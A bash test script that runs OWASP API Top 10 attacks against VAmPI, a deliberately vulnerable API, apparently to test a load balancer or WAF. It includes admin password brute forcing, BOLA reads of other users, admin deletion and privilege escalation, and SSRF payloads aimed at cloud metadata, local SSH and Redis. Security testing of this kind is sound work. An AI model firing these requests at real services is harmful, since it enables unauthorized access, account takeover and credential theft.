#!/bin/bash
# OWASP API Security Top 10 tests against VAmPI
# Tools: curl, jq
# Targets: VAmPI (Vulnerable API) endpoints via F5 XC LB
# Estimated duration: 2-3 minutes
set -euo pipefail

TARGET="${1:?Usage: 01-vampi-owasp-top10.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}/vampi"

echo "[*] OWASP API Top 10 suite against VAmPI at ${TARGET}"
echo ""

# --- Step 1: Register a test user ---
echo "[+] Registering test user..."
REG_RESP=$(curl -sk -X POST "${BASE}/users/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"attacker123","email":"attacker@evil.example"}' \
  --max-time 10) || true
echo "    Register response: ${REG_RESP}"

# --- Step 2: Login and get token ---
echo "[+] Logging in as test user..."
LOGIN_RESP=$(curl -sk -X POST "${BASE}/users/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"attacker123"}' \
  --max-time 10) || true
echo "    Login response: ${LOGIN_RESP}"

TOKEN=$(echo "$LOGIN_RESP" | jq -r '.auth_token // .authToken // empty' 2>/dev/null || true)
if [[ -z "$TOKEN" ]]; then
  echo "WARN: Could not extract auth token, continuing with empty token"
  TOKEN="invalid-token-for-testing"
fi
echo "    Token: ${TOKEN:0:20}..."

AUTH_HEADER="Authorization: Bearer ${TOKEN}"

echo ""

# --- API1: Broken Object Level Authorization (BOLA) ---
echo "[+] API1: BOLA - Accessing other users' data..."
for user in admin user1 user2 victim; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "$AUTH_HEADER" \
    "${BASE}/users/v1/${user}" \
    --max-time 10) || code="ERR"
  echo "    GET /users/v1/${user} -> HTTP ${code}"
done

echo ""

# --- API2: Broken Authentication ---
echo "[+] API2: Broken Authentication - Brute force login..."
for pass in password 123456 admin admin123 letmein; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "${BASE}/users/v1/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"${pass}\"}" \
    --max-time 10) || code="ERR"
  echo "    Login admin/${pass} -> HTTP ${code}"
done

echo ""

# --- API3: Excessive Data Exposure ---
echo "[+] API3: Excessive Data Exposure - Requesting full user list..."
code=$(curl -sk -w "\nHTTP %{http_code}" \
  -H "$AUTH_HEADER" \
  "${BASE}/users/v1" \
  --max-time 10) || code="ERR"
echo "    GET /users/v1 -> ${code}"

echo ""

# --- API5: Broken Function Level Authorization ---
echo "[+] API5: Broken Function Level Auth - Attempting admin actions..."
code=$(curl -sk -o /dev/null -w "%{http_code}" \
  -X DELETE -H "$AUTH_HEADER" \
  "${BASE}/users/v1/admin" \
  --max-time 10) || code="ERR"
echo "    DELETE /users/v1/admin -> HTTP ${code}"

code=$(curl -sk -o /dev/null -w "%{http_code}" \
  -X PUT -H "$AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d '{"admin":true}' \
  "${BASE}/users/v1/attacker" \
  --max-time 10) || code="ERR"
echo "    PUT /users/v1/attacker (escalate) -> HTTP ${code}"

echo ""

# --- API7: SSRF ---
echo "[+] API7: SSRF patterns..."
SSRF_TARGETS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://localhost:22"
  "http://127.0.0.1:6379"
  "http://internal.service.local/admin"
)
for ssrf_url in "${SSRF_TARGETS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "${BASE}/users/v1/_debug" \
    -H "Content-Type: application/json" \
    -H "$AUTH_HEADER" \
    -d "{\"url\":\"${ssrf_url}\"}" \
    --max-time 10) || code="ERR"
  echo "    SSRF ${ssrf_url} -> HTTP ${code}"
done

echo ""

# --- API8: Security Misconfiguration ---
echo "[+] API8: Security Misconfiguration - Probing debug endpoints..."
DEBUG_PATHS=("/_debug" "/console" "/swagger.json" "/openapi.json" "/v1/docs" "/admin")
for path in "${DEBUG_PATHS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE}${path}" \
    --max-time 10) || code="ERR"
  echo "    GET ${path} -> HTTP ${code}"
done

echo ""
echo "[*] OWASP API Top 10 suite complete"
